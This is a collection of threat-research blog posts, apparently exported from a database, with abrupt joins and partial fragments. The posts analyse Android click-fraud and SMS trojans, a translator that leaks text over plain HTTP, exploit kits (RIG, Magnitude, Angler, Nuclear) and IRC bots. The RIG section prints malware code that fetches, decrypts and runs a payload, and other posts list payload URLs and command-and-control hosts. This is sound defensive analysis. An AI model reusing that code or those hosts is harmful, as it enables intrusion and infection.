It is extremely popular and is currently ranked #10 under Top free Android apps. The users of this app include many well known celebrities who eventually post the dubbed videos on popular social networking platforms like Facebook and Twitter.\r\n\r\nThe popularity of this app has caught the attention of the malware authors too, which is evident with a string of Trojan Porn Clicker apps disguised as Dubsmash posted on the Google Play Store in the past month (covered in ESET and AVAST blogs). The malicious apps mentioned in those blogs were quickly taken down by Google. However, we continue to see newer variants of the same malware family being uploaded to the Google Play store with the latest one posing as Dubsmash V3.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Google Play - Trojan Porn Clicker app\r\n		\r\n	\r\n\r\nAlthough the malicious app poses as Dubsmash, the icon that the user sees upon installation imitates Settings, Memory Game, or a Flappy Bird app. The newest iteration of this malicious app has already been downloaded nearly 5,000 times.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake App Icon\r\n		\r\n	\r\n\r\nThe malware automatically removes the icon once the user quits the application for the first time, however it continues to run in the background as seen below.\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn Clicker Process\r\n		\r\n	\r\n\r\n\r\nPorn Clicker analysis\r\nThe purpose of this malware is to generate revenue for the malware author by generating clicks on the adult porn websites. While this may be good news that the user\'s credentials or sensitive information are not being stolen, it can still lead to financial loss for the end users through increased mobile data usage.\r\n\r\nThe Porn Clicker variants described in the previous blogs involved hardcoded, encrypted porn URLs in the malicious APK, whereas we are now seeing the newer variant dynamically retrieving the porn URLs from a remote server.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Clicking activity\r\n		\r\n	\r\n\r\nThe malicious app in our case contained two hardcoded URLs shown in the screenshot below:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn Clicker remote servers\r\n		\r\n	\r\n\r\nPreconfigured URLs:\r\n\r\n\r\n\r\n	memr[.]oxti.org/g/getasite/  - The malicious app will get a new porn URL to visit from this location.\r\n	memr[.]oxti.org/z/z2/ - This location currently serves JavaScript code that will result in a random click on the porn site that gets visited by the app.\r\n\r\n\r\nScreenshots below show the porn URLs that are dynamically retrieved  by the malicious app from the first location.\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn URL1\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn URL2\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Porn URL3\r\n		\r\n	\r\n\r\n\r\nJavaScript leveraged by the malicious app from a remote location to perform click fraud is shown in the screenshot below.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript - Random Click\r\n		\r\n	\r\n\r\nIt appears that the malware author keeps uploading and removing the same app on the Google Play store under different accounts.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (142, 'Machine Translators May Leak Confidential Information', 'Loren Weith', 'May 26, 2015', 'One challenge for enterprises dealing with confidential information in conjunction with cloud-based systems is that they must exercise due diligence to ensure that it remains confidential. The steps are beyond the scope of a technical blog, but generally it involves making sure that everyone processing the confidential information understands that it is sensitive and has agreed to protect it.\r\n\r\nFor cloud services like Enterprise Resource Planning (ERP), Human Resources, Video Conferencing and so on, the confidentiality issues are very well understood, but there are exceptions like machine translation. When we think of data leaks, we rightly look primarily to malicious software (worms, viruses, customized zero-days from Advanced Persistent Threats (APT\'s), etc.) when seeking to prevent confidential data from leaving a network.\r\n \r\n\r\n\r\n\r\nMachine translation tools are an interesting member of the “other” category of legitimate tools that can result in confidential data leaks without malicious intent from user or developer. Machine translation tools range from simple web sites like “youdao” pictured above or Google Translate, where it is pretty clear that information is leaving, up to integrated desktop applications, where the movement of data is not nearly as obvious.\r\n \r\n\r\n\r\n\r\nThe Youdao Dictionary application is installed like any other and operates like any other, except that the translation engine is remote and the application sends it’s lookups in plain text via insecure HTTP GET\'s. The fact that the translation tool is an application running on a user’s PC, makes it less likely that the person making use of it would realize that they are leaking information because the appearance is that their computer is doing the translation, not a web site.\r\n\r\nIn the above dissection of a URL retrieved by the tool, we see the word “information” being queried in the “q” field, but it could just as well be that someone isn\'t entirely sure what “Лечение герпеса Боба Джонса не будет хорошо” means, and would highlight it and click translate. That act results in the application enerating something similar to the plaintext query above, except with that chunk of Russian. The user will then learn that the string translates to “Bob Jones\' herpes treatment is not going well.” Unfortunately, the request and the translation are transferred in plaintext form, which can be learned by passive interception.\r\n\r\nThe application that we use as an example is from Youdao (有道), a major Chinese Internet company that, according to Wikipedia (http://en.wikipedia.org/wiki/Youdao), ships an offline and free online version of their translation tool. Through some limited experimentation, Youdao\'s site does seem to support the same functionality over the more secure, encrypted HTTPS protocol. We have observed insecure communication in the wild for versions ranging from 2.2.16 to 5.4.43, but it would be unfair to discuss the tool without looking at the latest version. The latest version of the Youdao tool we could find, version 6.3.66.1117, was downloaded from http://codown.youdao.com/cidian/static/6.3/20141203/YoudaoDict.exe and tested on a Windows 7 machine and there was no significant difference in behavior.\r\n\r\nOur test version also makes use of plaintext (HTTP) communication by default and appears to automatically translate whatever word is near the mouse pointer, whenever it stops moving, between Chinese and English. It also has an option where a small button appears that you can click (or hover over) to translate a highlighted piece of text. Having used the program, it is easy to imagine why this tool is popular with users who need to translate between Chinese and English. In addition to the translation features, it also keeps users from being bored by providing extra advertisements.\r\n\r\nWhat the tool provides in features, it definitely does not provide in security – while it works as intended and does not appear to be up to anything overtly nefarious, it still sends all the translation requests via the insecure HTTP protocol to a back-end server where the translation takes place.\r\nConclusion\r\nThe conclusion for customers is simple: translation software might send data to networks / systems outside your realm of control – if it does, then exactly as would be the case for a cloud-based ERP or Human Resources system, it is important to know where it goes, how it gets there, and that the third parties processing the information do so in a manner that is compatible with your organization\'s policies and contractual obligations. Given that the messages to be translated are sent in clear text, anyone on the same network could easily intercept the communication by sniffing network traffic. Translated content could range from benign phrases to highly sensitive information.\r\n\r\nQuestions to which we do not yet have answers, like whether the translation can be “paused,” if HTTPS can be enabled through configuration, if Youdao\'s privacy policy prevents disclosure, if any HTTPS functionality is implemented securely, etc. should be answered before deploying YoudaoDict or similar cloud-based translation tools in a confidential setting. Naturally, we would recommend to Youdao that they at least make use of HTTPS by default in future releases of their software, due to the risk of inadvertently disclosing their users\' confidential information.\r\nDetails\r\nThe following experiment was performed to verify whether traffic is still passed in plaintext HTTP GET requests, as it was in previous versions. The setup is a fake letter being written in notepad by an associate at the law firm of Nerd, Geek, and Spaz, LLP, who are defending a client who is being sued for some reason…\r\n \r\n\r\n\r\n\r\nWhen the two lines were highlighted, a little blue book popped up and hovering over the book results in a translation being executed. That translation is actually performed on a remote server and the following URL is visited by the software:\r\n \r\n\r\nhttp://dict.youdao.com/fsearch?keyfrom=deskdict.screentrans.http.0.stroke&q=Bill%20Jones%20is%20getting%20sued%20for%20some%20really%20embarassing%0D%0Aporn%20that%20was%20found%20on%20his%20work%20computer.%20%20Please%20advise&pos=-1&doctype=xml&xmlVersion=3.2&dogVersion=1.0&client=deskdict&id=8bba3b7bdf465c61b&vendor=unknown&in=YoudaoDict&appVer=6.3.66.1117&appZengqiang=0&abTest=&le=eng&fytype=AUTO&scrfrom=stroke&proc=notepad.exe\r\n\r\n\r\nFor convenience, we look at the same URL after decoding it and converting to pretty-printed JSON:\r\n \r\n\r\n{\r\n    \"username\": null, \r\n    \"netloc\": \"dict.youdao.com\", \r\n    \"vars\": {\r\n        \"appZengqiang\": \"0\", \r\n        \"vendor\": \"unknown\", \r\n        \"fytype\": \"AUTO\", \r\n        \"keyfrom\": \"deskdict.screentrans.http.0.stroke\", \r\n        \"dogVersion\": \"1.0\", \r\n        \"pos\": \"-1\", \r\n        \"doctype\": \"xml\", \r\n        \"q\": \"Bill%20Jones%20is%20getting%20sued%20for%20some%20really%20embarassing%0D%0Aporn%20that%20was%20found%20on%20his%20work%20computer.%20%20Please%20advise\", \r\n        \"le\": \"eng\", \r\n        \"appVer\": \"6.3.66.1117\", \r\n        \"client\": \"deskdict\", \r\n        \"in\": \"YoudaoDict\", \r\n        \"xmlVersion\": \"3.2\", \r\n        \"proc\": \"notepad.exe\", \r\n        \"id\": \"8bba3b7bdf465c61b\", \r\n        \"scrfrom\": \"stroke\"\r\n    }, \r\n    \"fragment\": \"\", \r\n    \"scheme\": \"http\", \r\n    \"hostname\": \"dict.youdao.com\", \r\n    \"params\": \"\", \r\n    \"query\": \"keyfrom=deskdict.screentrans.http.0.stroke&q=Bill%20Jones%20is%20getting%20sued%20for%20some%20really%20embarassing%0D%0Aporn%20that%20was%20found%20on%20his%20work%20computer.%20%20Please%20advise&pos=-1&doctype=xml&xmlVersion=3.2&dogVersion=1.0&client=deskdict&id=8bba3b7bdf465c61b&vendor=unknown&in=YoudaoDict&appVer=6.3.66.1117&appZengqiang=0&abTest=&le=eng&fytype=AUTO&scrfrom=stroke&proc=notepad.exe\", \r\n    \"path\": \"/fsearch\", \r\n    \"password\": null, \r\n    \"port\": null\r\n}\r\n\r\n\r\nWe can see the variables broken apart more easily in the JSON version and the sentence in our screen-shot it clearly visible with “%20” replacing the spaces and “%0A%0D” replacing the end of line.

First seen around April 2014, RIG has been in the news several times over the past year. In February, the source code was reportedly leaked online, which likely spurred some of the recent changes we\'ve observed in the kit. ThreatLabZ has been keeping an eye on RIG and in this post we\'ll cover an example of a full RIG infection cycle.    Delivery  In the past, RIG used malvertising and compromised sites to send users to RIG landing pages and we\'ve seen no change in this tactic. Compromised sites leading to RIG usually contain an iframe in the page header that loads a RIG proxy domain, which also contains an iframe leading to the RIG landing page. The full infection cycle is shown in the annotated Fiddler session below.       	  		  			  		  		  			Fig 1: RIG Infection Cycle  		  	        In this example, the compromised site actually contains three different malicious iframes in its header.

If anything is found, the next two code blocks are not deobfuscated or executed.       	  		  			  		  		  			Fig 7: Code block 1 deobfuscated - detect analysis environment  		  	        The second code block is a large base64-encoded VBScript segment:       	  		  			  		  		  			Fig 8: Code block 2 deobfuscated - vbscript  		  	        The VBScript is executed from the following code:        function time() {window.execScript(base64_decode(scriptvar), \"VBscript\");}setTimeout(time, 3001);        Once executed, the VBScript exploits CVE-2014-6332, the so-called \'Godmode\' exploit (VT detection - 4/57). AV detection tends to be particularly bad on the VBScript even though the code very closely matches the proof of concept originally publicized. There is a good writeup from TrendMicro, which delves into the details of this vulnerability. If exploitation is successful, the encrypted exe is downloaded, decrypted, and executed on the system. The encryption key for the binary is conveniently in cleartext within the VBScript:             If objHTTP.Status = 200 Then               Set objFile = objFSO.CreateTextFile(strSaveTo,True)               objFile.Write EnDeCrypt(ByteArray2String(objHTTP.responseBody), \"nkiOaWsg\")               objFile.Close               End If        The third block of code simply serves up a malicious SWF with no secondary obfuscation:       	  		  			  		  		  			Fig 9: Code block 3 deobfuscated - malicious SWF  		  	        This code is almost the same as in other exploit kits, and the URL of the encrypted binary is being passed to the SWF as a parameter. The exploit in this case was CVE-2015-0313, which affects Flash versions prior to 16.0.0.305, and the exploit code is contained in a script called \'wow.\' Detection on VirusTotal shows 10/57, and there are several public writeups on this vulnerability.    Payload #1 - Injector  The binary payload is encrypted with an 8-byte key, which you can guess from the stream or retrieve from the deobfuscated VBScript.       	  		  			  		  		  			Fig 10: Encrypted Binary - key is \'WsgnkiOa\'  		  	        VirusTotal detection is a bit better than 50% for this payload at 32/57. The binary file is a Nullsoft Installer self-extracting archive and extracting the archive reveals three files inside:       	  		  			  		  		  			Fig 11: Extracted Files from EXE  		  	        In addition to these three files, another executable \'b8.exe\' is dropped. Once the installer finishes dropping files, it loads the DLL (15/55 on VirusTotal) and begins executing functions to read in the other two files. The file \'6ag1rqashtwqw1hgqa\' contains data XOR\'d with the first 10 bytes of the filename, and the decrypted contents reveals several API calls that give us an idea of what will happen next, for example CreateProcessA, WriteProcessMemory, and ResumeThread.       	  		  			  		  		  			Fig 12: Decrypting file data with filename  		  	        Similarly, the \'Stevie Nicks\' .m3u is unfortunately not actually a playlist, but instead an encrypted binary that is decrypted by the DLL using the XOR key \"ZhmGqqKwXmJiiS7dzjzPyyaTw0PANF\".       	  		  			  		  		  			Fig 13: Decrypting \'Stevie Nicks\' playlist binary  		  	        VirusTotal detection on the decrypted Stevie Nicks binary is 35/56.  Ultimately, this leads to creating a hollow process of itself (process hollowing - PDF) which then creates an explorer.exe process and injects code to beacon to the Command & Control (C&C) server. Beacons were frequent and used the URI string \'/power/logout.php\' to POST to the domain \'starpowerss.com\'       	  		  			  		  		  			Fig 14: C&C Traffic Sample  		  	        Other notable activity includes:    	Copying to \'C:\\Program Files\\Common Files\\Windows Search 5.3.10\\<random>.exe\'  	Using the registry for persistence  	Hooking ZwOpenFile and ZwOpenProcess  	Clipboard control      Payload #2 - Blue Bot  After quite some time, a second payload is downloaded named \'cfajrs.exe\' from \'a.pomf.se\' which beacons to 141.138.157.240. Four URIs were observed:      	/help/proxy  	  		Returns a list of 4032 IP:PORT pairs (paste of IP:PORT data)  	  	  	/help/blog  	  		Returns a list of 798 URLs that appear to be blogs (paste of blog data)  	  	  	/help/botlogger.php  	  		Returns div of HTML with \"visitors online\" (see Fig 15)  	  	  	/help/target  	  		Returns \'STOP|STOP|STOP\' during analysis (see Fig 16)  	  	           	  		  			  		  		  			Fig 15: /help/botlogger.php response  		  	           	  		  			  		  		  			Fig 16: /help/target response  		  	        VirusTotal detection is 41/56 and indicates this is part of BlueBotnet. Looking at the binary, we see it\'s a .NET executable and uses no obfuscation at all to make decompilation difficult. Looking at the namespace and classes confirms this is called \'Blue_Botnet\' and appears to be a DoS tool.       	  		  			  		  		  			Fig 17: Blue_Botnet Code Overview  		  	      One of the more interesting functions is the \'updateTarget\' function, which expects a pipe-delimited list of IP, port, and method. There are multiple different methods accepted for the \'target\' command: UDP, TCP, SYN, MCBOTALPHA, HTTP, HTTPROXY, PRESS, and STOP.       	  		  			  		  		  			Fig 18: Blue_Botnet updateTarget Function  		  	        To perform its attacks, the bot has a list of 37 different user agent strings to make detection more difficult (paste of user agents); each request uses a different user agent from the list so requests look like they are coming from multiple different clients instead of from the same source. There is an Italian-language theme to the code, both in some of the variable names and in some of the HTTP headers, for example the Accept-Language header in the HTTP attack function shown below.       	  		  			  		  		  			Fig 19: Blue_Botnet HTTP Attack Function  		  	        Interestingly, the response from botlogger.php is not used in the code and the request may simply be a beacon to the server to keep count of infections.  Conclusions  RIG continues to be a popular and effective exploit kit choice and has evolved over the past year, indicating active development. While other exploit kits are moving toward ransomware and adfraud for monetization of infected victims, RIG is apparently not following this trend and still pushes more traditional malware. ThreatLabZ will continue to monitor RIG for any new developments. For a look at the infrastructure supporting RIG, Trustwave has a great post on the topic.', 'Exploit Kit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/rig-exploit-kit-infection-cycle-analysis');

Once the browser has been exploited, Magnitude proceeds to a new step in the infection cycle where the malware payload would normally be downloaded immediately following exploitation, we are now seeing a shellcode payload being served.         	  		  			  		  		  			Shellcode being served  		  	           The shellcode is a simple payload that utilizes the Windows library ‘urlmon.dll’ to attempt to fetch a list of URLs contained within the shellcode. In the cases we have seen so far, only the first URL results in a payload (CryptoWall 3.0), while the others return no data.         	  		  			  		  		  			CryptoWall payload download  		  	        This is a highly profitable ransomware payload that leverages Bitcoin transactions executed over the Tor Anonymizer to monetize the attack. Threat Actors utilize this method of collection because it can\'t be reliably traced back to the them. Victims are especially vulnerable to this type of extortion since very few people seem to backup their critical files such as documents and pictures.         	  		  			  		  		  			CryptoWall decryption instruction  		  	        ThreatLabZ has been actively monitoring this Magnitude EK activity and the image below illustrates the transactions we saw for this campaign:         	  		  			  		  		  			The Green represents Payload activity; The Blue represents Landing Page activity.  		  	      As with most threat actors, once they find a location that allows them to host their attacks they tend to stick with it. The lion\'s share of target IPs seen from our research show that Germany is the biggest hosting location for this activity.         	  		  			  		  		  			Other countries seen to host this activity: NL (3%) US(2%) JP(2%)  		  	      Conclusion  Exploit Kits are evolving to bypass standard security solutions that utilize basic URL filtering techniques. Attackers are utilizing various methods of infection, including malvertising and iFrame injection on compromised pages. Ransomware is a highly profitable, recording up to $33,000 per day at one point.

Dorkbot is also known as ngrBot due to it\'s similar feature set. It is one of the most powerful IRC based botnets that generates revenue for the botnet operator via the following features:\r\n\r\n \r\n\r\n\r\n	Capable of spreading via chat messengers, USB drives, & social networking sites\r\n	Supports multiple Distributed Denial of Service (DDoS) attack types\r\n	Capable of stealing login credentials for multiple HTTP and FTP sites\r\n	Blocks security update related websites to evade detection\r\n	Capable of downloading, installing and uninstalling other malware payloads\r\n\r\n\r\nRageBot, Phorpiex, and IRCBot.HI Analysis –\r\n\r\n\r\n\r\nFrom our 3 months telemetry data, we have seen the following URLs serving these IRC bots–\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n			\r\n			URL\r\n			\r\n			\r\n			\r\n			\r\n			MD5\r\n			\r\n			\r\n			\r\n			Malware Name\r\n			\r\n		\r\n		\r\n			\r\n			Ernsthaft[.]su/ert[.]exe\r\n			\r\n			\r\n			6C738D0A737D16C87EB40C24C5F594A6\r\n			\r\n			\r\n			IRCBot.HI\r\n			\r\n		\r\n		\r\n			\r\n			Mslighton[.]net/uploads/io[.]exe\r\n			\r\n			\r\n			C73DBA5827728EEAC59951B14AB329F4\r\n			\r\n			\r\n			RageBot\r\n			\r\n		\r\n		\r\n			\r\n			Colorfashionbox[.]com/u[.]exe\r\n			\r\n			\r\n			F919C902AC07AF339BBD753E6EFF89C7\r\n			\r\n			\r\n			Phorpiex\r\n			\r\n		\r\n		\r\n			\r\n			Dumanfun[.]com/t[.]exe\r\n			\r\n			\r\n			DBC477DF90D4ECB37B698C571DE90D11\r\n			\r\n			\r\n			Phorpiex\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nIn addition to IRC based C&C communication, all these bots have following similarity in their operation:\r\n\r\n\r\n \r\n\r\n1. Checks execution environment - Virtual Environment, Honeypot or Sandbox\r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			RageBot - Check via Username\r\n		\r\n	\r\n\r\nAs seen in the screenshot above, Ragebot is checking for common usernames found in certain public sandboxing environments before executing further.\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex - Check via DLL name\r\n		\r\n	\r\n\r\nPhorpiex bot looks for strings like \'qemu\', \'virtual\', and \'vmware\' in system registry to check for execution in Virtual Environment.

The app generates fraudulent transactions from an infected device by purchasing on-demand videos and premium SMS services controlled by the attacker. SMS messages are generated by the app to initiate a purchase. The app then monitors incoming SMS messages to identify the purchase validation message, which must be accurately responded to in order to complete the transaction. When the validation message has been intercepted, it is parsed and matched against the hardcoded strings in the image above, to determine and submit the appropriate response. Once this occurs, the transaction is complete and the victim will be charged by their mobile provider.           	  		  			  		  		  			SMS Trojan Fraud cycle  		  	           	  		  			  		  		  			SMS send function.

Cybercriminals leverage compromised advertising networks to serve malicious advertisements on legitimate websites which subsequently infect the visitors. This has become one of the most successful vectors of malware delivery for cybercriminals. Malvertising campaigns in most cases will involve a malicious advertisement redirecting the user to an Exploit Kit (EK) landing page.    Exploit Kits  Exploit Kits are web-based frameworks that attempt to exploit browser application plugins for known vulnerabilities. Upon successful exploitation, the EK will silently download and install a malware payload on the victim machine. The entire exploit cycle is completely hidden from the end user.    The Exploit Kit infection cycle typically moves through three distinct stages:    Stage 1 - Loading stage: This stage involves the initial delivery mechanism which causes the user to visit a compromised website or advertisement. This compromised website then leads the user to the actual Exploit Kit landing page which may involve a series of web redirects.    The initial delivery vector can be any of the following:    	Spam & phishing e-mail  	Social Networking sites  	SEO poisoning  	Compromised website  	Malvertising on legitimate sites    It is important to note that malvertising is one of the most dangerous and extremely successful initial delivery mechanism here as even the most cautious user is susceptible to this attack while visiting a perfectly legitimate website. In most other cases, a well informed user can avoid the attack by carefully inspecting the link in an e-mail or search results.    Stage 2 - Landing Stage: During this stage, the victim machine visits the actual EK hosting site and the exploit cycle is started. The EK code will attempt to exploit the identified vulnerable plugins by downloading the relevant exploit payloads.    Upon successful exploitation, the EK will lead to the download of the malware payload as configured by the EK operator. The entire exploit cycle may not require any user intervention in most cases, which greatly increases the success rates.    Stage 3 - Malware Payload Delivery: This is the final stage of the Exlpoit Kit infection cycle where the malware executable is downloaded and installed on the victim machine. This is usually achieved, after successful exploitation, by one of the EK payloads that was served during the landing stage.    The EK operators strive to ensure that the EK code, exploit payloads and the end malware payloads have very low to zero antivirus detection. Over the past few years, EK authors have implemented multiple new features to improve the effectiveness & infection success rates:    	Anti-VM and Anti-Analysis features  	Detection of known antivirus drivers  	Multiple levels of highly obfuscated JavaScript code  	Dynamic construction of exploit payload URLs only when a vulnerable plugin is found  	Short lived exploit payload URLs often restricted to one visit per IP address  	Obfuscated and repackaged exploit payloads  	Repackaged malware payloads    Recent Malvertising & EK campaigns  After last year’s infamous “Kyle & Stan” malvertising campaign that affected Google, Yahoo, YouTube and multiple other popular websites, this year has been no different. We have seen a malvertising campaign leading to a zero day Flash Exploit payload via the Angler EK to start of the year, followed by a Malvertising campaign targeting European Transit users. There have been numerous other instances of Malvertising which involved popular sites like huffingtonpost.com, yahoo.com, zillow.com and we only expect this trend to continue throughout the year.       	  		  			  		  		  			Malvertising attempts blocked [Last 7 days]  		  	        	  		  			  		  		  			Users targeted globally by Malvertising [Last 7 days]  		  	      Advanced techniques to evade detection  We have also noticed some new techniques being introduced in the Malvertising & EK exploit chain this year to further evade detection by URL reputation & network scanners:    	302 cushioning, or a \'cushion attack\', is used to redirect victims to malicious sites via simple HTTP 302 redirects rather than traditional techniques like iframes or JavaScript redirects which are easy to detect by network IDS/IPS devices.  	Domain Shadowing, involves compromising the parent domain and creating multiple sub-domains that point to malicious code.      Please refer to our most recent write-up describing it in more detail.    A typical Malvertising infection cycle would involve following stages:       	  		  			  		  		  			Malvertising infection cycle  		  	      Cybercrime Infrastructure & Business Model    Threat actors involved at different stages of the infection cycles are part of a thriving Cybercrime infrastructure & business model that is all interconnected as seen below:       	  		  			  		  		  			Cybercrime Infrastructure & Business Model  		  	      The top Exploit Kits that we have seen involved in various Malvertising campaigns in 2015 are:    	Angler  	Nuclear  	Magnitude  	RIG      Angler Exploit Kit      Angler Exploit Kit is one of the most prevalent exploit kits in existence today and has many similarities with other exploit kits. Victims are usually served Angler landing pages via compromised websites where an iframe or script has been injected into the compromised site\'s page and loads Angler\'s exploit page. The landing page for Angler is very similar to Nuclear, but instead of displaying totally randomized text for obfuscation, random passages from the novel \"Sense and Sensibility\" are used. Angler domains at first glance may look like legitimate domains, for example:    inspirablebacktenter.modernlifestyle[.]com         Angler EK operators are leveraging domain shadowing technique to shield their landing sites from URL categorization-based detection. Over the past few months, we\'ve seen Angler changing tactics somewhat. In late 2014, the landing page took the form of a 10 character alphanumeric php page, for example:     /l86dvw7qfp.php  /62ynh7h2e9.php  /ukvugw2mct.php    This format quickly changed to exclude the php extension, then changed to an entirely new format:    /govern_wickets_insulator/1305714616  /pews-bathrobe-understatement/2333676765  /pions_fingertips_rebuff/8057907058341  /pounces-garrotted-bedfellow-mingling/387249683138585374    This is another attempt to blend in with normal looking web traffic. Exploit pages and payloads have a similarly consistent format that has not noticeably changed since late 2014:    /3R6sqI6COwSVqj-FeU2X7WK5qWYlpQskmTr-ivR7ZSZuIbap/9Oj96BjEJ7Rpe-CuvXMl_DVaDQFeQV53vYrJekoio1vi9dIc/eS9vXVpGOZhiD1CflWv8J9AeWGa_auetZVWzsTeBZqZTSXlR/VZsq9DV0HzNyc0_HxSiYUpc4_NiyZW729YthGRWUQOssgshN/JQqtNNYjlHsJNYAFZDsQEJIFAF227hht8nMx0qCyo6HRXuO8      The majority of the recent Angler EK infections were serving the Bedep AdFraud bot.       	  		  			  		  		  			Angler EK instances blocked  		  	        	  		  			  		  		  			Angler EK server locations  		  	        Nuclear Exploit Kit      Nuclear EK is arguably the most advanced exploit kit currently in use and includes a variety of different exploits. First appearing in 2009, the kit is very actively developed, with new exploits and defenses added incrementally over the years, and it is used to serve any number of payloads, including ransomware, click fraud, and multiple backdoors. Nuclear contains exploits for multiple common software components, including Flash, Internet Explorer, Java and Silverlight. Notably, in March 2015, the kit began including a Flash exploit for CVE-2015-0336 only a week after a patch was released by Adobe. Similar to Angler EK, Nuclear uses compromised webservers to serve exploits via 302-cushioning and domain shadowing, but free subdomain and dynamic DNS providers are also heavily used.    sstmxixcdr.serveftp[.]com/xqpjvl5oabhksk1fqq1bwl1afxdcs09xxxbjf1pdva.html  fu7bncm7xzjwu6hcfhuwwgg.90saniye[.]com/xvsobfbfaayaaxcou1gfcfvbs1wrefrrulaoebvovlfixfjkufgphacxulkl.html  azwbm2qdqs276gxw9qj82fg.akildakalici[.]net/rkklfaaacu1yh0aexaniauyvawypak8rcebtxquavh9ydl4kvvbsbfspulgxc1is.html  Using new subdomains of compromised sites enables Nuclear to evade older, domain-based blocking and allows for rapid rotation or one-time use of subdomains to hinder analysis by security researchers. In addition, before actually serving the exploit kit\'s landing page, potential victims are sent through an intermediary hop via 302-redirection; the victim is either 302-redirected to the landing page if this is a new victim, or sent to the desired non-malicious page.    Another interesting feature of Nuclear is that various fields are Base64-encoded and passed to the malicious domain:  ce79suqo5euujfchllkmwwf.alumni-year-book[.]com/index.php?a=cmtpbWJwZ2Q9cWEmdGltZT0xNTA0MTUwNjU0NjExNjY2ODgyJnNyYz0zMjImc3VybD1vbmVoYWxseXUuY29tJnNwb3J0PTgwJmtleT0xOUZGM0EwJnN1cmk9L3RvcGljLzQ0NzU0LSUyNUUyJTI1OTklMjVBNS10aGUtb2ZmaWNpYWwtJTI1RTIlMjU5OSUyNUE1LW5hbXNvbmctY291cGxlLSUyNUUyJTI1OTklMjVBNS10aHJlYWQtJTI1RTIlMjU5OSUyNUE1Lw==  --base64 decoded--  rkimbpgd=qa&time=1504150654611666882&src=322&surl=onehallyu.com&sport=80&key=19FF3A0&suri=/topic/44754-%25E2%2599%25A5-the-official-%25E2%2599%25A5-namsong-couple-%25E2%2599%25A5-thread-%25E2%2599%25A5/  Similar to Angler, the landing page contains sections of highly obfuscated JavaScript in between chunks of text; however, unlike Angler, Nuclear uses totally randomized text, which makes landing pages more difficult to detect using traditional signatures.    <textarea id=\'DjwvKE\' title=\'riaXWWvroLTqxkFhlrC\' name=\'MTdak\' cols=\'84\' rows=\'7\'>cbkKKLhgidYWpsNmcSUOJXFDrjdbvBIScsdmDKTlorIdjVQMnlaxJgAAPecLfkdIdGvgRPSFGbjqwACkmcivIjwYOYjuJNCmUySlNlrUMbKJbMuNpcJyMFWadGUnTXZnVsYjdQDqrOATbuhQXqPjvlJZseMLBmyXeXGInJyfYyzztgPQWeASQJsInFUprSMVqSddccJAbIzUoPlLuleLvWUjboYSHloxDRbgukhVthqixbtrNYDIuXsWMQpTBdQFvsmpcTLVBCDyexqrVtAQRsndJcxLGORBGDriXDEYFIXkGNbcG</textarea>  <h2>QMx sKWhYGWu eZJGyZ aFnKgWwC xfgcc KmTs rOETlec oBWPHKZ yVrHkWnM AXkEQvfe oPeaHHcdWk kYVRPcClQO GmV gQl</h2>  <h4>fQgQqXM gvllOkaC HknmN qvPFFFKKja TRNMxyHikW JYAb QOWuNSKTX mhzDYzV</h4>  The majority of the recent Nuclear EK infections were serving Teslacrypt Ransomware.         	  		  			  		  		  			Nuclear EK instances blocked  		  	        	  		  			  		  		  			Nuclear EK server locations  		  	      Magnitude Exploit Kit      Magnitude EK, like Angler and Nuclear, is heavily reliant on landing page javascript obfuscation as a means of both exploiting the victim’s system and hindering detection. First documented in October 2013, the kit targets users with outdated Browser application plugins and CVE-2015-0336 was recently included in the kit’s arsenal of exploits. This exploit kit has historically leveraged malvertising for distribution rather than compromising individual websites. ThreatLabZ has observed numerous ad networks being used as intermediaries, including one campaign which saw Yahoo! ads redirecting victims to Magnitude landing pages.         A Magnitude landing page is easy to spot at a glance since they typically have an unusually large number of subdomains, as seen in the examples below.    55e3a.76ec.b9.d9a6a.b863cb4.01962.4abd.c0s7894l6e3.basicmagic[.]pw/?17657271617e787b766376796376637e3974787a  ba5.861fa24.4f.f40.e0c1.f51.afb.47340.7a.o7faf55lqj.workerscertain[.]in/?2b594e4d5d4244474a5f4a455f4a5f4205484446    The payload page for these threats is the same hostname and domain followed by a 32-40 character hexadecimal string. The final payload is ransomware called CryptoWall 3.0, which encrypts the victim’s files. CryptoWall displays a message demanding payment for decrypting the files; this ransom increases depending on how long the victim waits. This is done to give the victim less time to find an alternative solution and to get the maximum amount of money from the victim.            	  		  			  		  		  			Magnitude EK instances blocked  		  	        	  		  			  		  		  			Magnitude EK server locations  		  	             RIG Exploit Kit      The RIG EK has been a relative newcomer to the exploit kit ecosystem. Since its debut in early 2014, it has been a prevalent threat to web-surfers. The developers have been very active in updating it with the latest features common to other exploit kits, and is currently making heavy use of domain shadowing. One major difference between RIG and others seems to be the modularity of the kit itself. RIG doesn\'t contain any exploits directly, but relies on a backend service for providing exploits. This is evidenced by the source code that was supposedly leaked by a RIG developer in February 2015. The leak seems to have been the result of internal squabbles between the developers, with the leak intended as a final blow to the development team. Customer posts on underground forums complained that their RIG deployments would occasionally be hijacked to deliver malware payloads that they did not designate for use. These issues point to a rogue developer in the RIG team, and the availability of the source will surely result in the emergence of derivative exploit kits.         Though RIG has made news by being injected into some major sites such as JQuery.org and AskMen.com, it appears that RIG is most frequently encountered via a combination of Malvertising and search poisoning. We commonly see redirectors that match the following two patterns:    domain.tld/search  domain.tld/search.php    There’s a two stage landing page that follows the redirectors, with the 